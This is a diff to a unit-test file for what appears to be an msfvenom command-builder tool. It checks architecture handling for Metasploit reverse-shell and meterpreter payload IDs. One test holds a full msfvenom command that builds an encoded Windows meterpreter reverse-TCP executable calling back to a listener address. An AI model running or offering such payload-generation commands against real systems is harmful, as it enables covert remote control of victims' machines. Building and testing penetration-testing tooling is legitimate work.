@@ -41,12 +41,21 @@ function baseSelection(overrides: Partial<MsfvenomSelection>): MsfvenomSelection
 }
 
 describe("resolvePayloadId", () => {
-  it("substitutes {arch} for path-segment payloads", () => {
+  it("substitutes {arch} for path-segment payloads, including the default arch", () => {
     expect(resolvePayloadId(linuxShell, "x64")).toBe("linux/x64/shell_reverse_tcp");
+    expect(resolvePayloadId(linuxShell, "x86")).toBe("linux/x86/shell_reverse_tcp");
   });
 
   it("leaves flag-only payload ids untouched regardless of arch", () => {
-    expect(resolvePayloadId(windowsMeterpreter, "x64")).toBe("windows/meterpreter/reverse_tcp");
+    expect(resolvePayloadId(pythonPayload, null)).toBe("python/meterpreter/reverse_tcp");
+  });
+
+  it("windows-arch-segment payloads stay flat for x86 (msfvenom's implicit module)", () => {
+    expect(resolvePayloadId(windowsMeterpreter, "x86")).toBe("windows/meterpreter/reverse_tcp");
+  });
+
+  it("windows-arch-segment payloads insert an explicit x64/ segment for x64 (a genuinely separate module)", () => {
+    expect(resolvePayloadId(windowsMeterpreter, "x64")).toBe("windows/x64/meterpreter/reverse_tcp");
   });
 });
 
@@ -78,9 +87,10 @@ describe("buildCommand", () => {
     expect(cmd).not.toContain(" -a ");
   });
 
-  it("includes -a for flag-only multi-arch payloads", () => {
+  it("omits -a for windows-arch-segment payloads too (arch is baked into -p, not passed via -a)", () => {
     const cmd = buildCommand(baseSelection({ arch: "x64" }));
-    expect(cmd).toContain("-a x64");
+    expect(cmd).toContain("-p windows/x64/meterpreter/reverse_tcp");
+    expect(cmd).not.toContain(" -a ");
   });
 
   it("omits -a entirely when arch is null", () => {
@@ -118,7 +128,7 @@ describe("buildCommand", () => {
       baseSelection({ encoder: shikata, iterations: 2, arch: "x86", lhost: "192.168.1.100", lport: 4444, filename: "payload.exe" }),
     );
     expect(cmd).toBe(
-      "msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 2 -a x86 LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -o payload.exe",
+      "msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 2 LHOST=192.168.1.100 LPORT=4444 EXITFUNC=thread -o payload.exe",
     );
   });
 
